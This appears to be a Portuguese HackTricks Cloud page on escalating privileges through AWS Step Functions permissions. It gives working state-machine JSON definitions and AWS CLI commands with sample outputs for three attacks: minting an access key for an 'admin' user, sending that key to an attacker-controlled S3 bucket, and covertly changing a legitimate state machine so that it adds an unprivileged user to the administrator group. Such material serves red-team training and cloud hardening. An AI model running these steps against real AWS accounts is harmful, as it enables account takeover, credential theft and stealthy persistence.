# AWS - Step Functions Privesc

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Step Functions

Para mais informa√ß√µes sobre este servi√ßo AWS, confira:

{% content-ref url="../aws-services/aws-stepfunctions-enum.md" %}
[aws-stepfunctions-enum.md](../aws-services/aws-stepfunctions-enum.md)
{% endcontent-ref %}

### `states:TestState` & `iam:PassRole`

Um atacante com as permiss√µes **`states:TestState`** & **`iam:PassRole`** pode testar qualquer estado e passar qualquer fun√ß√£o IAM para ele sem criar ou atualizar uma m√°quina de estados existente, permitindo acesso n√£o autorizado a outros servi√ßos AWS com as permiss√µes das fun√ß√µes. potencialmente. Combinadas, essas permiss√µes podem levar a a√ß√µes n√£o autorizadas extensas, desde manipula√ß√£o de fluxos de trabalho para alterar dados at√© vazamentos de dados, manipula√ß√£o de recursos e escalonamento de privil√©gios.

{% code overflow="wrap" %}
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
{% endcode %}

Os seguintes exemplos mostram como testar um estado que cria uma chave de acesso para o usu√°rio **`admin`** aproveitando essas permiss√µes e um papel permissivo do ambiente AWS. Este papel permissivo deve ter qualquer pol√≠tica de alto privil√©gio associada a ele (por exemplo, **`arn:aws:iam::aws:policy/AdministratorAccess`**) que permite que o estado execute a a√ß√£o **`iam:CreateAccessKey`**:

* **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
* **Comando** executado para realizar o privesc:

{% code overflow="wrap" %}
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
{% endcode %}

**Impacto Potencial**: Execu√ß√£o e manipula√ß√£o n√£o autorizadas de fluxos de trabalho e acesso a recursos sens√≠veis, potencialmente levando a viola√ß√µes de seguran√ßa significativas.

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

Um atacante com **`states:CreateStateMachine`** & **`iam:PassRole`** seria capaz de criar uma m√°quina de estado e fornecer a ela qualquer fun√ß√£o IAM, permitindo acesso n√£o autorizado a outros servi√ßos AWS com as permiss√µes da fun√ß√£o. Em contraste com a t√©cnica de eleva√ß√£o de privil√©gios anterior (**`states:TestState`** & **`iam:PassRole`**), esta n√£o se executa por si s√≥, voc√™ tamb√©m precisar√° ter as permiss√µes **`states:StartExecution`** ou **`states:StartSyncExecution`** (**`states:StartSyncExecution`** **n√£o est√° dispon√≠vel para fluxos de trabalho padr√£o**, **apenas para m√°quinas de estado expressas**) para iniciar uma execu√ß√£o sobre a m√°quina de estado.

{% code overflow="wrap" %}
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]

# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]

# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
{% endcode %}

Os seguintes exemplos mostram como criar uma m√°quina de estado que cria uma chave de acesso para o **`admin`** usu√°rio e exfiltra essa chave de acesso para um bucket S3 controlado pelo atacante, aproveitando essas permiss√µes e um papel permissivo do ambiente AWS. Esse papel permissivo deve ter qualquer pol√≠tica de alto privil√©gio associada a ele (por exemplo, **`arn:aws:iam::aws:policy/AdministratorAccess`**) que permite que a m√°quina de estado execute as a√ß√µes **`iam:CreateAccessKey`** e **`s3:putObject`**.

* **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
* **Comando** executado para **criar a m√°quina de estados**:

{% code overflow="wrap" %}
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
{% endcode %}

* **Comando** executado para **iniciar uma execu√ß√£o** da m√°quina de estados criada anteriormente:

{% code overflow="wrap" %}
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
{% endcode %}

{% hint style="warning" %}
O bucket S3 controlado pelo atacante deve ter permiss√µes para aceitar uma a√ß√£o s3:PutObject da conta da v√≠tima.
{% endhint %}

**Impacto Potencial**: Execu√ß√£o n√£o autorizada e manipula√ß√£o de fluxos de trabalho e acesso a recursos sens√≠veis, potencialmente levando a viola√ß√µes de seguran√ßa significativas.

### `states:UpdateStateMachine` & (n√£o sempre necess√°rio) `iam:PassRole`

Um atacante com a permiss√£o **`states:UpdateStateMachine`** seria capaz de modificar a defini√ß√£o de uma m√°quina de estados, podendo adicionar estados extras furtivos que poderiam resultar em uma escalada de privil√©gios. Dessa forma, quando um usu√°rio leg√≠timo inicia uma execu√ß√£o da m√°quina de estados, esse novo estado furtivo malicioso ser√° executado e a escalada de privil√©gios ser√° bem-sucedida.

Dependendo de qu√£o permissivo √© o Papel IAM associado √† m√°quina de estados, um atacante enfrentaria 2 situa√ß√µes:

1. **Papel IAM Permissivo**: Se o Papel IAM associado √† m√°quina de estados j√° for permissivo (ele tem, por exemplo, a pol√≠tica **`arn:aws:iam::aws:policy/AdministratorAccess`** anexada), ent√£o a permiss√£o **`iam:PassRole`** n√£o seria necess√°ria para escalar privil√©gios, uma vez que n√£o seria necess√°rio atualizar o Papel IAM, com a defini√ß√£o da m√°quina de estados √© suficiente.
2. **Papel IAM N√£o Permissivo**: Em contraste com o caso anterior, aqui um atacante tamb√©m precisaria da permiss√£o **`iam:PassRole`** uma vez que seria necess√°rio associar um Papel IAM permissivo √† m√°quina de estados al√©m de modificar a defini√ß√£o da m√°quina de estados.

{% code overflow="wrap" %}
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
{% endcode %}

Os seguintes exemplos mostram como atualizar uma m√°quina de estado leg√≠tima que apenas invoca uma fun√ß√£o Lambda HelloWorld, a fim de adicionar um estado extra que adiciona o usu√°rio **`unprivilegedUser`** ao grupo IAM **`administrator`**. Dessa forma, quando um usu√°rio leg√≠timo inicia uma execu√ß√£o da m√°quina de estado atualizada, este novo estado malicioso e furtivo ser√° executado e a escalada de privil√©gios ser√° bem-sucedida.

{% hint style="warning" %}
Se a m√°quina de estado n√£o tiver um papel IAM permissivo associado, tamb√©m seria necess√°rio a permiss√£o **`iam:PassRole`** para atualizar o papel IAM a fim de associar um papel IAM permissivo (por exemplo, um com a pol√≠tica **`arn:aws:iam::aws:policy/AdministratorAccess`** anexada).
{% endhint %}

{% tabs %}
{% tab title="M√°quina de Estado Leg√≠tima" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% tab title="M√°quina de Estado Atualizada Maliciosa" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}
{% endtabs %}

* **Comando** executado para **atualizar** **a m√°quina de estados leg√≠tima**:

{% code overflow="wrap" %}
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
{% endcode %}

**Impacto Potencial**: Execu√ß√£o e manipula√ß√£o n√£o autorizadas de fluxos de trabalho e acesso a recursos sens√≠veis, potencialmente levando a viola√ß√µes de seguran√ßa significativas.

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}
